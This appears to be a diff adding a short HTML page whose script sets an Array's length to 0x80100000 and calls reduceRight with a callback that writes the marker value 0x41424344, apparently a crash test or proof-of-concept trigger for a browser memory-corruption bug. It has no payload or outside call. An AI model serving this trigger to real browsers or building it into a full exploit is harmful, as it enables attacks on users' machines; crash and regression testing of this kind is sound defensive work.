@@ -1,0 +1,13 @@
+<html>
+<script>
+foo = new Array;
+foo.length = 0x80100000
+
+a = function bar(prev, current, index, array) {
+  current[0] = 0x41424344;
+}
+foo.reduceRight(a,1,2,3)
+</script>
+<body>
+</body>
+</html>
